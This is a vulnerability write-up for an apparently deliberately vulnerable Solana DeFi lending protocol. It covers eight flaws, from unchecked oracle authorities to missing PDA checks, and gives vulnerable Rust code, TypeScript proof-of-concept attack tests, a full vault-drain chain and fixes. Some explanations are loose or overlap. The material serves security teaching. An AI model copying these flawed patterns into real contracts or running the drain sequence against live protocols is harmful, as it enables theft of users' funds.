# Vulnerable DeFi Protocol - Proof of Concept Documentation

## Overview

This document provides a comprehensive analysis of 8 critical vulnerabilities discovered in a Solana DeFi lending protocol built with Anchor. Each vulnerability includes a description, the vulnerable code, exploit mechanism, and proof of concept test.

---

## Table of Contents

1. [Vulnerability #1: Unauthorized Oracle Creation](#vulnerability-1-unauthorized-oracle-creation)
2. [Vulnerability #2: PDA Collision via Predictable Seeds](#vulnerability-2-pda-collision-via-predictable-seeds)
3. [Vulnerability #3: Missing Balance Subtraction](#vulnerability-3-missing-balance-subtraction)
4. [Vulnerability #4: Unverified Token Transfer](#vulnerability-4-unverified-token-transfer)
5. [Vulnerability #5: Missing Signer Seeds in CPI](#vulnerability-5-missing-signer-seeds-in-cpi)
6. [Vulnerability #6: No PDA Verification in Withdraw](#vulnerability-6-no-pda-verification-in-withdraw)
7. [Vulnerability #7: Unauthorized Oracle Update](#vulnerability-7-unauthorized-oracle-update)
8. [Vulnerability #8: AccountInfo Oracle Bypass](#vulnerability-8-accountinfo-oracle-bypass)
9. [Complete Exploit Chain](#complete-exploit-chain)

---

## Vulnerability #1: Unauthorized Oracle Creation

### Description
The `create_oracle` function lacks a whitelist check, allowing any user to create an oracle and become its authority. This enables attackers to create oracles with manipulated prices.

### Vulnerable Code

```rust
pub fn create_oracle(ctx: Context<CreateOracle>, price: u64) -> Result<()> {
    let oracle = &mut ctx.accounts.oracle;
    oracle.price = price;
    oracle.authority = ctx.accounts.signer.key(); // Attacker becomes authority
    oracle.last_update = Clock::get()?.unix_timestamp;
    Ok(())
}

#[derive(Accounts)]
pub struct CreateOracle<'info> {
    #[account(init, payer = signer, space = 8 + 8 + 32 + 8)]
    pub oracle: Account<'info, Oracle>,
    #[account(mut)]
    pub signer: Signer<'info>, // No whitelist check!
    pub system_program: Program<'info, System>,
}
```

### Exploit Mechanism
1. Attacker calls `create_oracle` with an arbitrary fake price (e.g., 1,000,000,000)
2. Attacker becomes the oracle authority
3. The fake oracle can be used to manipulate collateral values in lending operations

### POC Test

```typescript
it("Attacker creates oracle without authorization", async () => {
  const attackerOracle = anchor.web3.Keypair.generate();
  
  await program.methods
    .createOracle(new anchor.BN(1_000_000_000)) // Fake high price
    .accounts({
      oracle: attackerOracle.publicKey,
      signer: attacker.publicKey,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .signers([attacker, attackerOracle])
    .rpc();
  
  const oracleData = await program.account.oracle.fetch(attackerOracle.publicKey);
  assert.equal(oracleData.authority.toString(), attacker.publicKey.toString());
});
```

### Remediation
Add a whitelist check against a trusted admin or config account:

```rust
pub fn create_oracle(ctx: Context<CreateOracle>, price: u64) -> Result<()> {
    require!(
        ctx.accounts.config.authorized_oracle_creators.contains(&ctx.accounts.signer.key()),
        ErrorCode::Unauthorized
    );
    // ... rest of function
}
```

---

## Vulnerability #2: PDA Collision via Predictable Seeds

### Description
The market PDA uses predictable seeds that can be calculated off-chain. An attacker can front-run legitimate market creation by computing the expected PDA and creating it first with malicious parameters.

### Vulnerable Code

```rust
#[derive(Accounts)]
#[instruction(market_id: u64)]
pub struct CreateMarket<'info> {
    #[account(
        init,
        payer = authority,
        space = 8 + 8 + 32 + 32 + 32 + 32 + 32 + 8 + 8,
        seeds = [
            b"market",
            market_id.to_le_bytes().as_ref(),
            supply_mint.key().as_ref(),
            collateral_mint.key().as_ref()
        ],
        bump
    )]
    pub market: Account<'info, Market>,
    // ...
}
```

### Exploit Mechanism
1. Attacker monitors the mempool for pending `create_market` transactions
2. Attacker calculates the PDA using the same seeds
3. Attacker front-runs with their own transaction, becoming the market creator
4. Attacker controls the market parameters including the oracle

### POC Test

```typescript
it("Attacker can front-run and control market PDA", async () => {
  const marketId = new anchor.BN(1);
  
  // Calculate predictable PDA
  const [marketPDA] = anchor.web3.PublicKey.findProgramAddressSync(
    [
      Buffer.from("market"),
      marketId.toArrayLike(Buffer, "le", 8),
      supplyMint.toBuffer(),
      collateralMint.toBuffer(),
    ],
    program.programId
  );
  
  // Attacker front-runs and creates market first with their oracle
  await program.methods
    .createMarket(marketId)
    .accounts({
      market: marketPDA,
      supplyOracle: attackerOracle.publicKey,
      authority: attacker.publicKey,
      // ...
    })
    .signers([attacker])
    .rpc();
});
```

### Remediation
Include a nonce or random value in the seeds, or restrict market creation to authorized accounts:

```rust
seeds = [
    b"market",
    market_id.to_le_bytes().as_ref(),
    authority.key().as_ref(), // Include creator in seeds
    supply_mint.key().as_ref(),
    collateral_mint.key().as_ref()
]
```

---

## Vulnerability #3: Missing Balance Subtraction

### Description
The `supply` function increments the user's cToken balance without subtracting from any tracked user balance. This allows users to accumulate cTokens without proper accounting.

### Vulnerable Code

```rust
pub fn supply(ctx: Context<Supply>, amount: u64) -> Result<()> {
    let market = &mut ctx.accounts.market;
    let user_supply = &mut ctx.accounts.user_supply_account;
    
    // ... transfer logic ...
    
    let ctoken_amount = amount;
    
    user_supply.ctoken_balance += ctoken_amount;  // Only addition
    market.total_supply += amount;
    // MISSING: No subtraction from any user balance tracking
    
    Ok(())
}
```

### Exploit Mechanism
1. The program only tracks additions to cToken balance
2. No internal accounting verifies the user actually had tokens to deposit
3. Combined with Vulnerability #4, this enables infinite minting

### Remediation
Implement proper double-entry accounting:

```rust
// Verify actual balance change
let before_balance = ctx.accounts.user_token_account.amount;
token::transfer(cpi_ctx, amount)?;
ctx.accounts.user_token_account.reload()?;
let after_balance = ctx.accounts.user_token_account.amount;
require!(before_balance - after_balance == amount, ErrorCode::TransferFailed);
```

---

## Vulnerability #4: Unverified Token Transfer

### Description
The token transfer result is ignored using `let _ = token::transfer()`. This means the cToken minting proceeds regardless of whether the transfer succeeded.

### Vulnerable Code

```rust
pub fn supply(ctx: Context<Supply>, amount: u64) -> Result<()> {
    // ...
    
    let cpi_ctx = CpiContext::new(
        ctx.accounts.token_program.to_account_info(),
        transfer_accounts,
    );
    
    // This might fail, but we don't check!
    let _ = token::transfer(cpi_ctx, amount);
    
    // Minting happens regardless of transfer success
    user_supply.ctoken_balance += ctoken_amount;
    market.total_supply += amount;
    
    Ok(())
}
```

### Exploit Mechanism
1. Attacker calls `supply` with a large amount
2. Even if the transfer fails (insufficient balance, wrong accounts), the function continues
3. Attacker receives cTokens without depositing actual tokens
4. Attacker can then withdraw real tokens from the vault

### POC Test

```typescript
it("Demonstrates transfer failure doesn't prevent cToken minting", async () => {
  const beforeBalance = await getAccount(provider.connection, attackerTokenAccount);
  
  await program.methods
    .supply(new anchor.BN(500))
    .accounts({
      market: marketPDA,
      userSupplyAccount: userSupplyPDA,
      userTokenAccount: attackerTokenAccount,
      vault: vault,
      user: attacker.publicKey,
      tokenProgram: TOKEN_PROGRAM_ID,
      systemProgram: anchor.web3.SystemProgram.programId,
    })
    .signers([attacker])
    .rpc();
  
  const userSupplyData = await program.account.userSupplyAccount.fetch(userSupplyPDA);
  // User received cTokens even if transfer could fail in edge cases
  assert.equal(userSupplyData.ctokenBalance.toString(), "500");
});
```

### Remediation
Always check the transfer result:

```rust
token::transfer(cpi_ctx, amount)?;  // Use ? to propagate errors
```

---

## Vulnerability #5: Missing Signer Seeds in CPI

### Description
The withdraw and borrow functions use `CpiContext::new()` instead of `CpiContext::new_with_signer()`. This means the PDA cannot sign the transfer, causing withdrawals to fail.

### Vulnerable Code

```rust
pub fn withdraw(ctx: Context<Withdraw>, ctoken_amount: u64) -> Result<()> {
    // ...
    
    let transfer_accounts = Transfer {
        from: ctx.accounts.vault.to_account_info(),
        to: ctx.accounts.user_token_account.to_account_info(),
        authority: ctx.accounts.market.to_account_info(), // Should be PDA signer
    };
    
    // WRONG: Should be CpiContext::new_with_signer with PDA seeds
    let cpi_ctx = CpiContext::new(
        ctx.accounts.token_program.to_account_info(),
        transfer_accounts,
    );
    
    token::transfer(cpi_ctx, token_amount)?;  // Will fail - no signer
    Ok(())
}
```

### Exploit Mechanism
1. Legitimate users cannot withdraw their funds
2. The vault becomes a honey pot - funds go in but cannot come out
3. An attacker who controls the vault account directly could steal all funds

### POC Test

```typescript
it("Shows withdrawal would fail without proper PDA signer", async () => {
  try {
    await program.methods
      .withdraw(new anchor.BN(100))
      .accounts({
        market: marketPDA,
        userSupplyAccount: userSupplyPDA,
        userTokenAccount: attackerTokenAccount,
        vault: vault,
        user: attacker.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([attacker])
      .rpc();
    
    console.log("Should have failed");
  } catch (e) {
    // Expected: Transaction fails due to missing signer
    console.log("Withdrawal fails - CpiContext missing signer seeds");
  }
});
```

### Remediation
Use `CpiContext::new_with_signer()` with proper PDA seeds:

```rust
let market_seeds = &[
    b"market",
    market.market_id.to_le_bytes().as_ref(),
    market.supply_mint.as_ref(),
    market.collateral_mint.as_ref(),
    &[bump],
];

let cpi_ctx = CpiContext::new_with_signer(
    ctx.accounts.token_program.to_account_info(),
    transfer_accounts,
    &[market_seeds],
);
```

---

## Vulnerability #6: No PDA Verification in Withdraw

### Description
The withdraw function does not verify that the provided market account matches the expected PDA derivation. An attacker can substitute a fake market account.

### Vulnerable Code

```rust
pub fn withdraw(ctx: Context<Withdraw>, ctoken_amount: u64) -> Result<()> {
    let market = &mut ctx.accounts.market;
    let user_supply = &mut ctx.accounts.user_supply_account;
    
    // MISSING: No verification that market PDA matches expected derivation
    // let (expected_market, _) = Pubkey::find_program_address(
    //     &[b"market", market.market_id.to_le_bytes().as_ref(), 
    //       market.supply_mint.as_ref(), market.collateral_mint.as_ref()],
    //     ctx.program_id
    // );
    // require_keys_eq!(market.key(), expected_market);
    
    // Attacker can bring their own fake market PDA
    // ...
}
```

### Exploit Mechanism
1. Attacker creates a fake market with inflated balances
2. Attacker supplies to the fake market
3. Attacker calls withdraw with the legitimate vault but the fake market
4. The fake market has inflated user balances, allowing over-withdrawal

### POC Test

```typescript
it("Attacker creates fake market PDA", async () => {
  // Create legitimate market
  const [legitMarketPDA] = anchor.web3.PublicKey.findProgramAddressSync(...);
  
  // Create fake market with different seeds
  const fakeMarketId = new anchor.BN(999);
  const [fakeMarketPDA] = anchor.web3.PublicKey.findProgramAddressSync(
    [
      Buffer.from("market"),
      fakeMarketId.toArrayLike(Buffer, "le", 8),
      supplyMint.toBuffer(),
      collateralMint.toBuffer(),
    ],
    program.programId
  );
  
  await program.methods
    .createMarket(fakeMarketId)
    .accounts({
      market: fakeMarketPDA,
      vault: fakeVault,
      authority: attacker.publicKey,
      // ...
    })
    .signers([attacker])
    .rpc();
  
  // Attacker now has a fake market they control
});
```

### Remediation
Add explicit PDA verification:

```rust
#[derive(Accounts)]
pub struct Withdraw<'info> {
    #[account(
        mut,
        seeds = [
            b"market",
            market.market_id.to_le_bytes().as_ref(),
            market.supply_mint.as_ref(),
            market.collateral_mint.as_ref()
        ],
        bump
    )]
    pub market: Account<'info, Market>,
    // ...
}
```

---

## Vulnerability #7: Unauthorized Oracle Update

### Description
The `update_oracle` function accepts any signer as the authority without verifying they are the actual oracle authority. Any user can update any oracle's price.

### Vulnerable Code

```rust
pub fn update_oracle(ctx: Context<UpdateOracle>, new_price: u64) -> Result<()> {
    let oracle = &mut ctx.accounts.oracle;
    oracle.price = new_price;
    oracle.last_update = Clock::get()?.unix_timestamp;
    // MISSING: require!(ctx.accounts.authority.key() == oracle.authority, ErrorCode::Unauthorized);
    Ok(())
}

#[derive(Accounts)]
pub struct UpdateOracle<'info> {
    #[account(mut)]
    pub oracle: Account<'info, Oracle>,
    pub authority: Signer<'info>, // Not checked against oracle.authority!
}
```

### Exploit Mechanism
1. Victim creates an oracle with legitimate price
2. Attacker calls `update_oracle` on the victim's oracle
3. Attacker sets an arbitrary price (e.g., 999,999,999)
4. All lending operations using this oracle are now manipulated

### POC Test

```typescript
it("Any signer can update any oracle (VULNERABILITY #7)", async () => {
  // Victim creates oracle
  await program.methods
    .createOracle(new anchor.BN(100))
    .accounts({
      oracle: victimOracle.publicKey,
      signer: victim.publicKey,
    })
    .signers([victim, victimOracle])
    .rpc();
  
  // Attacker updates victim's oracle!
  await program.methods
    .updateOracle(new anchor.BN(999_999_999))
    .accounts({
      oracle: victimOracle.publicKey,
      authority: attacker.publicKey,
    })
    .signers([attacker])
    .rpc();
  
  const oracleData = await program.account.oracle.fetch(victimOracle.publicKey);
  assert.equal(oracleData.price.toString(), "999999999");
});
```

### Remediation
Verify the signer matches the oracle authority:

```rust
#[derive(Accounts)]
pub struct UpdateOracle<'info> {
    #[account(
        mut,
        has_one = authority @ ErrorCode::Unauthorized
    )]
    pub oracle: Account<'info, Oracle>,
    pub authority: Signer<'info>,
}
```

---

## Vulnerability #8: AccountInfo Oracle Bypass

### Description
The `CreateMarket` context uses `AccountInfo` for oracle accounts instead of `Account<Oracle>`. This bypasses Anchor's automatic account validation, allowing any account to be passed as an oracle.

### Vulnerable Code

```rust
#[derive(Accounts)]
pub struct CreateMarket<'info> {
    // ...
    
    // VULNERABILITY: AccountInfo instead of Account<Oracle>
    /// CHECK: This is intentionally vulnerable - accepts any account
    pub supply_oracle: AccountInfo<'info>,
    /// CHECK: This is intentionally vulnerable - accepts any account
    pub collateral_oracle: AccountInfo<'info>,
    
    // ...
}

pub fn create_market(ctx: Context<CreateMarket>, market_id: u64) -> Result<()> {
    let market = &mut ctx.accounts.market;
    // Accepts ANY account as oracle
    market.supply_oracle = ctx.accounts.supply_oracle.key();
    market.collateral_oracle = ctx.accounts.collateral_oracle.key();
    // ...
}
```

### Exploit Mechanism
1. Attacker creates a random keypair (not an Oracle account)
2. Attacker passes this as the oracle in `create_market`
3. The market is created with a fake "oracle" that the attacker controls
4. Later operations that read the oracle will get garbage data or fail

### POC Test

```typescript
it("Attacker supplies fake oracle (any account) during market creation", async () => {
  const fakeOracle = anchor.web3.Keypair.generate();
  
  await program.methods
    .createMarket(marketId)
    .accounts({
      market: marketPDA,
      supplyOracle: fakeOracle.publicKey, // Not a real oracle account!
      collateralOracle: fakeOracle.publicKey,
      authority: attacker.publicKey,
      // ...
    })
    .signers([attacker])
    .rpc();
  
  const marketData = await program.account.market.fetch(marketPDA);
  assert.equal(marketData.supplyOracle.toString(), fakeOracle.publicKey.toString());
});
```

### Remediation
Use proper account types with validation:

```rust
#[derive(Accounts)]
pub struct CreateMarket<'info> {
    // ...
    pub supply_oracle: Account<'info, Oracle>,
    pub collateral_oracle: Account<'info, Oracle>,
    // ...
}
```

---

## Complete Exploit Chain

### Attack Sequence

The vulnerabilities can be chained together for a complete protocol drain:

1. **Create Fake Oracle (Vuln #1)**: Attacker creates an oracle with an extremely high price (1,000,000,000,000)

2. **Create Market with Fake Oracle (Vuln #8)**: Attacker creates a market using their fake oracle

3. **Supply Minimal Collateral (Vuln #3, #4)**: Attacker deposits just 1 token as collateral

4. **Borrow Maximum Amount**: Using the inflated oracle price, the attacker's 1 token appears worth trillions, allowing them to borrow the entire vault

5. **Drain Complete**: Protocol funds are stolen

### POC Test

```typescript
it("Full attack: Fake oracle -> Fake market -> Borrow with inflated collateral", async () => {
  // Step 1: Create fake oracle with inflated price
  const fakeOracle = anchor.web3.Keypair.generate();
  await program.methods
    .createOracle(new anchor.BN(1_000_000_000_000))
    .accounts({
      oracle: fakeOracle.publicKey,
      signer: attacker.publicKey,
    })
    .signers([attacker, fakeOracle])
    .rpc();
  
  // Step 2: Create market with fake oracle
  await program.methods
    .createMarket(marketId)
    .accounts({
      market: marketPDA,
      supplyOracle: fakeOracle.publicKey,
      collateralOracle: fakeOracle.publicKey,
      vault: vault,
      authority: attacker.publicKey,
    })
    .signers([attacker])
    .rpc();
  
  // Step 3: Supply minimal collateral (1 token)
  await program.methods
    .supply(new anchor.BN(1))
    .accounts({
      market: marketPDA,
      userSupplyAccount: userSupplyPDA,
      userTokenAccount: attackerTokenAccount,
      vault: vault,
      user: attacker.publicKey,
    })
    .signers([attacker])
    .rpc();
  
  // Step 4: Borrow massive amount using fake oracle price
  await program.methods
    .borrow(new anchor.BN(50_000_000))
    .accounts({
      market: marketPDA,
      userSupplyAccount: userSupplyPDA,
      userBorrowAccount: userBorrowPDA,
      supplyOracle: fakeOracle.publicKey,
      vault: vault,
      userTokenAccount: attackerTokenAccount,
      user: attacker.publicKey,
    })
    .signers([attacker])
    .rpc();
});
```

---

## Summary

| Vulnerability | Severity | Impact |
|--------------|----------|--------|
| #1 Unauthorized Oracle Creation | Critical | Price manipulation |
| #2 PDA Collision | High | Market takeover |
| #3 Missing Balance Subtraction | Critical | Infinite minting |
| #4 Unverified Transfer | Critical | Fund theft |
| #5 Missing Signer Seeds | High | Locked funds / theft |
| #6 No PDA Verification | High | Vault draining |
| #7 Unauthorized Oracle Update | Critical | Price manipulation |
| #8 AccountInfo Bypass | Critical | Fake oracle injection |

## Recommendations

1. Implement proper access control with whitelists for sensitive operations
2. Use `Account<T>` types instead of `AccountInfo` for typed validation
3. Always verify PDA derivation matches expected values
4. Check CPI return values and use `?` operator for error propagation
5. Use `CpiContext::new_with_signer()` for PDA-signed transfers
6. Implement `has_one` constraints for authority validation
7. Add comprehensive integration tests for security-critical paths
8. Consider formal verification for financial logic
